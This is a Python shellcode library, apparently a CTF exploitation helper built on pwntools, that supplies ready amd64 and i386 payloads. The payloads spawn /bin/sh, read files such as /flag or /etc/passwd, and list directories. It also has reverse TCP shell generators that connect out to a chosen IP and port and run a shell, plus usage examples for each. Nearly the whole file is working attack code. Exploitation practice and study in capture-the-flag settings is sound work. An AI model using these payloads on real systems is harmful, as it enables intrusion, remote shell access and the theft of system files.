#!/usr/bin/env python3
# -*- encoding: utf-8 -*-
"""
File: shellcode.py
Time: 2021/11/23 23:44:54 (Modified: 2025/02/18)
Author: Roderick Chan (Modified)
Email: roderickchan@foxmail.com
Description: Provides a collection of convenient shellcodes for amd64 and i386 architectures.
             This version includes orw/onatrw shellcodes and directory listing functionality.
"""

import sys
from pwn import pack, asm, context

# List of all exported functions and variables
__all__ = [
    "amd64_execve_bin_sh",
    "amd64_execveat_bin_sh",
    "amd64_orw",
    "amd64_onatrw",
    "amd64_ls_current_dir",
    "amd64_list_directory",
    "amd64_ascii_shellcode",
    "amd64_reverse_tcp_connect",
    "amd64_reverse_tcp_shell",
    "i386_execve_bin_sh",
    "i386_orw",
    "i386_onatrw",
    "i386_ls_current_dir",
    "i386_list_directory",
    "i386_reverse_tcp_shell",
    "generate_payload_for_connect",
    "shellcode2unicode"
]

# ==============================
# Shellcodes for amd64
# ==============================

# Predefined execve shellcodes (from shell-storm.org)
_amd64_all_execve_bin_sh = {
    27: b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05",
    29: b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
}
amd64_execve_bin_sh = _amd64_all_execve_bin_sh[27]
amd64_execveat_bin_sh = _amd64_all_execve_bin_sh[29]

def amd64_orw(path: str = "/flag") -> bytes:
    """
    Generate amd64 shellcode for open-read-write operations.

    The shellcode performs these operations:
    1. Opens the specified file using 'open' syscall (syscall number 2)
       - Uses O_RDONLY flag (0)
    2. Reads file content into a stack buffer
       - Allocates 0x1000 bytes on stack
       - Uses 'read' syscall (syscall number 0)
    3. Writes content to stdout
       - Uses 'write' syscall (syscall number 1)
    4. Exits cleanly
       - Uses 'exit' syscall (syscall number 60)

    Args:
        path (str): Path to the file to read (default: "/flag")

    Returns:
        bytes: The assembled shellcode
    """
    context.arch = "amd64"
    if not path.endswith("\x00"):
        path += "\x00"
    sc = asm('''
        jmp get_path
    shellcode:
        /* Open */
        pop rdi                 /* path */
        xor rsi, rsi           /* O_RDONLY (0) */
        push 2
        pop rax                /* SYS_open */
        syscall

        /* Read */
        mov rdi, rax           /* fd from open() */
        sub rsp, 0x100        /* Allocate stack buffer */
        mov rsi, rsp           /* Buffer address */
        mov rdx, 0x100        /* Buffer size */
        xor rax, rax           /* SYS_read */
        syscall

        /* Write */
        mov rdx, rax           /* Use bytes read as count */
        mov rdi, 1             /* stdout fd */
        mov rsi, rsp           /* Buffer address */
        mov rax, 1             /* SYS_write */
        syscall

        /* Exit */
        mov rax, 60            /* SYS_exit */
        xor rdi, rdi           /* status = 0 */
        syscall

    get_path:
        call shellcode         /* Push path address to stack */
    ''')
    sc += path.encode('latin-1')
    return sc

def amd64_onatrw(path: str = "/flag", dirfd: int = -100) -> bytes:
    """
    Generate amd64 shellcode for openat-read-write operations.

    The shellcode performs these operations:
    1. Opens the specified file using 'openat' syscall (syscall number 257)
       - Uses provided dirfd (default: AT_FDCWD [-100])
       - Uses O_RDONLY flag (0)
    2. Reads file content into a stack buffer
       - Allocates 0x1000 bytes on stack
       - Uses 'read' syscall (syscall number 0)
    3. Writes content to stdout
       - Uses 'write' syscall (syscall number 1)
    4. Exits cleanly
       - Uses 'exit' syscall (syscall number 60)

    Args:
        path (str): Path to the file to read (default: "/flag")
        dirfd (int): Directory file descriptor (default: -100 for AT_FDCWD)

    Returns:
        bytes: The assembled shellcode
    """
    context.arch = "amd64"
    if not path.endswith("\x00"):
        path += "\x00"
    sc = asm(f'''
        jmp get_path
    shellcode:
        /* Openat */
        mov rdi, {dirfd}
        pop rsi
        xor rdx, rdx
        push 257
        pop rax
        syscall

        /* Read */
        mov rdi, rax
        mov rsi, rsp
        push 0x100
        pop rdx
        xor rax, rax
        syscall

        /* Write */
        push 0x1
        pop rdi
        push 0x100
        pop rdx
        mov rsi, rsp
        push 0x1
        pop rax
        syscall

    get_path:
        call shellcode         /* Push path address to stack */
    ''')
    sc += path.encode('latin-1')
    return sc

# Keep existing ls_current_dir shellcode
amd64_ls_current_dir = b"\x68\x2f\x2e\x01\x01\x81\x34\x24\x01\x01\x01\x01\x48\x89\xe7\x31\xd2\xbe\x01\x01\x02\x01\x81\xf6\x01\x01\x03\x01\x6a\x02\x58\x0f\x05\x48\x89\xc7\x31\xd2\xb6\x03\x48\x89\xe6\x6a\x4e\x58\x0f\x05\x6a\x01\x5f\x31\xd2\xb6\x03\x48\x89\xe6\x6a\x01\x58\x0f\x05"

def amd64_list_directory(path: str = ".") -> bytes:
    """
    Generate amd64 shellcode that uses getdents64 to list directory contents.

    The shellcode performs these operations:
    1. Opens the directory using 'open' syscall
       - Uses O_RDONLY flag
    2. Uses getdents64 syscall (syscall number 217) to read directory entries
       - Allocates 0x1000 bytes buffer on stack
    3. Writes the raw directory entries to stdout
       - User needs to parse the binary data format
    4. Exits cleanly

    Args:
        path (str): Directory path to list (default: ".")

    Returns:
        bytes: The assembled shellcode
    """
    context.arch = "amd64"
    if not path.endswith("\x00"):
        path += "\x00"
    sc = asm('''
        jmp get_path
    shellcode:
        /* Open directory */
        pop rdi                /* path */
        xor rsi, rsi           /* O_RDONLY */
        push 2
        pop rax                /* SYS_open */
        syscall

        /* getdents64 */
        mov rdi, rax           /* dirfd from open() */
        sub rsp, 0x1000        /* Allocate stack buffer */
        mov rsi, rsp           /* Buffer for directory entries */
        mov rdx, 0x1000        /* Buffer size */
        mov rax, 217           /* SYS_getdents64 */
        syscall

        /* Write entries to stdout */
        mov rdx, rax           /* Use bytes read as count */
        mov rdi, 1             /* stdout fd */
        mov rsi, rsp           /* Buffer address */
        mov rax, 1             /* SYS_write */
        syscall

        /* Exit */
        mov rax, 60            /* SYS_exit */
        xor rdi, rdi           /* status = 0 */
        syscall

    get_path:
        call shellcode         /* Push path address to stack */
    ''')
    sc += path.encode('latin-1')
    return sc

def amd64_reverse_tcp_connect(ip: str, port: int) -> bytes:
    """
    Generate a reverse TCP connect shellcode for amd64 architecture.

    This shellcode creates a socket, connects to the given IP and port,
    and then continues execution.

    Args:
        ip (str): Target IP address (e.g., "127.0.0.1").
        port (int): Target port number (e.g., 4444).

    Returns:
        bytes: The shellcode bytes.
    """
    int_ip = 0
    for part in ip.strip().split("."):
        int_ip = (int_ip << 8) | int(part)
    res = (
        b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x97\xb0\x2a\x48\xb9\x02\x00" +
        port.to_bytes(2, "big") +
        int_ip.to_bytes(4, "big") +
        b"\x51\x54\x5e\xb2\x10\x0f\x05"
    )
    return res

def amd64_ascii_shellcode(reg="rax"):
    """
    Return an ascii shellcode fragment based on the register.

    Supported registers: rax, rbx, rcx, rdx, rdi, rsi, rsp, rbp.

    Args:
        reg (str): Name of the register.

    Returns:
        bytes: The ascii shellcode fragment.

    Exits the program if the register is not supported.
    """
    mapping = {
        "rax": b"P",
        "rbx": b"S",
        "rcx": b"Q",
        "rdx": b"R",
        "rdi": b"W",
        "rsi": b"V",
        "rsp": b"T",
        "rbp": b"U"
    }
    if reg not in mapping:
        print("Only supported registers:", mapping.keys())
        sys.exit(1)
    return mapping[reg] + b"h0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"

def amd64_reverse_tcp_shell(ip: str, port: int) -> bytes:
    """
    Generate a reverse TCP shell shellcode for amd64 architecture.

    This shellcode creates a socket, connects to the specified IP and port,
    duplicates file descriptors, and executes "/bin/sh".

    Args:
        ip (str): Target IP address.
        port (int): Target port.

    Returns:
        bytes: The shellcode bytes.
    """
    """
            /* socket(AF_INET, SOCK_STREAM, 0) */
            socket:
                push 41
                pop rax
                cdq
                push 2
                pop rdi
                push 1
                pop rsi
                syscall

            /* connect(s, addr, len(addr))  */
            connect:
                xchg eax, edi
                mov al, 42
                mov rcx, 0x0100007f5c110002 /*127.0.0.1:4444 --> 0x7f000001:0x115c*/
                push rcx
                push rsp
                pop rsi
                mov dl, 16
                syscall
            dup2:
                push 3
                pop rsi
            dup2_loop:
                mov al, 33
                dec esi
                syscall
                jnz dup2_loop
            execve:
                cdq
                mov al, 59
                push rdx
                mov rcx, 0x68732f6e69622f
                push rcx
                push rsp
                pop rdi
                syscall
    """
    int_ip = 0
    for part in ip.strip().split("."):
        int_ip = (int_ip << 8) | int(part)
    return (
        b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x97\xb0\x2a\x48\xb9\x02\x00" +
        port.to_bytes(2, "big") +
        int_ip.to_bytes(4, "big") +
        b"\x51\x54\x5e\xb2\x10\x0f\x05\x6a\x03\x5e\xb0\x21\xff\xce\x0f\x05\x75\xf8\x99\xb0\x3b"
        b"\x52\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x00\x51\x54\x5f\x0f\x05"
    )


# ==============================
# Shellcodes for i386
# ==============================

# Predefined execve shellcodes
_i386_all_execve_bin_sh = {
    21: b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80",
    23: b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80",
    28: b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80",
    33: b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80",
    49: b"\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x0a\x8d\x56\x0e\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x64\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43"
}
i386_execve_bin_sh = _i386_all_execve_bin_sh[21]

def i386_orw(path: str = "/flag") -> bytes:
    """
    Generate i386 shellcode for open-read-write operations.

    The shellcode performs these operations:
    1. Opens the specified file using 'open' syscall (syscall number 5)
       - Uses O_RDONLY flag (0)
    2. Reads file content into a stack buffer
       - Allocates 0x1000 bytes on stack
       - Uses 'read' syscall (syscall number 3)
    3. Writes content to stdout
       - Uses 'write' syscall (syscall number 4)
    4. Exits cleanly
       - Uses 'exit' syscall (syscall number 1)

    Args:
        path (str): Path to the file to read (default: "/flag")

    Returns:
        bytes: The assembled shellcode
    """
    context.arch = "i386"
    if not path.endswith("\x00"):
        path += "\x00"
    sc = asm('''
        jmp get_path
    shellcode:
        /* Open */
        pop ebx                /* path */
        xor ecx, ecx           /* O_RDONLY (0) */
        xor edx, edx           /* mode = 0 */
        mov al, 5              /* SYS_open */
        int 0x80

        /* Read */
        mov ebx, eax           /* fd from open() */
        sub esp, 0x1000        /* Allocate stack buffer */
        mov ecx, esp           /* Buffer address */
        mov edx, 0x1000        /* Buffer size */
        mov al, 3              /* SYS_read */
        int 0x80

        /* Write */
        mov edx, eax           /* Use bytes read as count */
        mov ecx, esp           /* Buffer address */
        mov ebx, 1             /* stdout fd */
        mov al, 4              /* SYS_write */
        int 0x80

        /* Exit */
        xor ebx, ebx           /* status = 0 */
        mov al, 1              /* SYS_exit */
        int 0x80

    get_path:
        call shellcode         /* Push path address to stack */
    ''')
    sc += path.encode('latin-1')
    return sc

def i386_onatrw(path: str = "/flag", dirfd: int = -100) -> bytes:
    """
    Generate i386 shellcode for openat-read-write operations.

    The shellcode performs these operations:
    1. Opens the specified file using 'openat' syscall (syscall number 295)
       - Uses provided dirfd (default: AT_FDCWD [-100])
       - Uses O_RDONLY flag (0)
    2. Reads file content into a stack buffer
       - Allocates 0x1000 bytes on stack
       - Uses 'read' syscall (syscall number 3)
    3. Writes content to stdout
       - Uses 'write' syscall (syscall number 4)
    4. Exits cleanly
       - Uses 'exit' syscall (syscall number 1)

    Args:
        path (str): Path to the file to read (default: "/flag")
        dirfd (int): Directory file descriptor (default: -100 for AT_FDCWD)

    Returns:
        bytes: The assembled shellcode
    """
    context.arch = "i386"
    if not path.endswith("\x00"):
        path += "\x00"
    sc = asm(f'''
        jmp get_path
    shellcode:
        /* Openat */
        push {dirfd}           /* dirfd (AT_FDCWD) */
        pop ebx
        pop ecx                /* path */
        xor edx, edx           /* O_RDONLY (0) */
        mov al, 295            /* SYS_openat */
        int 0x80

        /* Read */
        mov ebx, eax           /* fd from openat() */
        sub esp, 0x1000        /* Allocate stack buffer */
        mov ecx, esp           /* Buffer address */
        mov edx, 0x1000        /* Buffer size */
        mov al, 3              /* SYS_read */
        int 0x80

        /* Write */
        mov edx, eax           /* Use bytes read as count */
        mov ecx, esp           /* Buffer address */
        mov ebx, 1             /* stdout fd */
        mov al, 4              /* SYS_write */
        int 0x80

        /* Exit */
        xor ebx, ebx           /* status = 0 */
        mov al, 1              /* SYS_exit */
        int 0x80

    get_path:
        call shellcode         /* Push path address to stack */
    ''')
    sc += path.encode('latin-1')
    return sc

# Keep existing ls_current_dir shellcode
i386_ls_current_dir = b"\x68\x01\x01\x01\x01\x81\x34\x24\x2f\x2e\x01\x01\x89\xe3\xb9\xff\xff\xfe\xff\xf7\xd1\x31\xd2\x6a\x05\x58\xcd\x80\x89\xc3\x89\xe1\x31\xd2\xb6\x02\x31\xc0\xb0\x8d\xcd\x80\x6a\x01\x5b\x89\xe1\x31\xd2\xb6\x02\x6a\x04\x58\xcd\x80"

def i386_list_directory(path: str = ".") -> bytes:
    """
    Generate i386 shellcode that uses getdents to list directory contents.

    The shellcode performs these operations:
    1. Opens the directory using 'open' syscall
       - Uses O_RDONLY flag
    2. Uses getdents syscall (syscall number 141) to read directory entries
       - Allocates 0x1000 bytes buffer on stack
    3. Writes the raw directory entries to stdout
       - User needs to parse the binary data format
    4. Exits cleanly

    Args:
        path (str): Directory path to list (default: ".")

    Returns:
        bytes: The assembled shellcode
    """
    context.arch = "i386"
    if not path.endswith("\x00"):
        path += "\x00"
    sc = asm('''
        jmp get_path
    shellcode:
        /* Open directory */
        pop ebx                /* path */
        xor ecx, ecx           /* O_RDONLY */
        mov al, 5              /* SYS_open */
        int 0x80

        /* getdents */
        mov ebx, eax           /* dirfd from open() */
        sub esp, 0x1000        /* Allocate stack buffer */
        mov ecx, esp           /* Buffer for directory entries */
        mov edx, 0x1000        /* Buffer size */
        mov al, 141            /* SYS_getdents */
        int 0x80

        /* Write entries to stdout */
        mov edx, eax           /* Use bytes read as count */
        mov ecx, esp           /* Buffer address */
        mov ebx, 1             /* stdout fd */
        mov al, 4              /* SYS_write */
        int 0x80

        /* Exit */
        xor ebx, ebx           /* status = 0 */
        mov al, 1              /* SYS_exit */
        int 0x80

    get_path:
        call shellcode         /* Push path address to stack */
    ''')
    sc += path.encode('latin-1')
    return sc

def i386_reverse_tcp_shell(ip: str, port: int) -> bytes:
    """
    Generate a reverse TCP shell shellcode for i386 architecture.

    This shellcode:
    1. Creates a socket
    2. Connects to the specified IP and port
    3. Redirects stdin/stdout/stderr to socket
    4. Executes /bin/sh

    Args:
        ip (str): Target IP address
        port (int): Target port

    Returns:
        bytes: The shellcode bytes
    """
    int_ip = 0
    for part in ip.strip().split("."):
        int_ip = (int_ip << 8) | int(part)
    return (
        b"\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68" +
        int_ip.to_bytes(4, "big") +
        b"\x66\x68" + port.to_bytes(2, "big") +
        b"\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda"
        b"\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68"
        b"\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
    )

def generate_payload_for_connect(ip: str, port: int) -> bytes:
  """connect(socket_fd, buf, 0x10), generate payload of buf

        assert len(buf) == 0x10

  """
  int_ip = 0
  for i in ip.strip().split("."):
      int_ip <<= 8
      int_ip |= int(i)

  return pack(2, word_size=16, endianness="little") + pack(port, word_size=16, endianness="big") + pack(int_ip, word_size=32, endianness="big") + pack(0, 64)

def shellcode2unicode(shellcode: str or bytes) -> str:
    """
    Convert shellcode into a unicode string in the format '\\xNN'.

    For example, the character 'a' will be converted to '\\x61'.

    Args:
        shellcode (str or bytes): Input shellcode

    Returns:
        str: The shellcode formatted as a unicode string

    Example:
        >>> s = shellcode2unicode('abcd')
        >>> print(s)
        \\x61\\x62\\x63\\x64
    """
    assert isinstance(shellcode, (str, bytes))
    if isinstance(shellcode, str):
        shellcode = shellcode.encode('latin-1')
    shellcode_hex = shellcode.hex()
    res = ""
    for i in range(0, len(shellcode_hex), 2):
        res += "\\x{}".format(shellcode_hex[i:i+2])
    return res

# ==============================
# Usage Examples
# ==============================

if __name__ == '__main__':
    import doctest
    doctest.testmod()

'''
Example usage:
1. Basic file reading with orw:
    shellcode = amd64_orw("/etc/passwd")
    print(shellcode2unicode(shellcode))

2. Reading file with openat:
    shellcode = amd64_onatrw("/secret/flag", dirfd=-100)  # Using AT_FDCWD
    print(shellcode2unicode(shellcode))

3. Listing directory contents:
    shellcode = amd64_list_directory("/home/user")
    print(shellcode2unicode(shellcode))

4. Reverse shell:
    ip = "127.0.0.1"
    port = 4444
    shellcode = i386_reverse_tcp_shell(ip, port)
    print(shellcode2unicode(shellcode))

Note: All shellcodes contain null bytes and are intended for direct binary exploitation,
not for string-based vulnerabilities.
'''
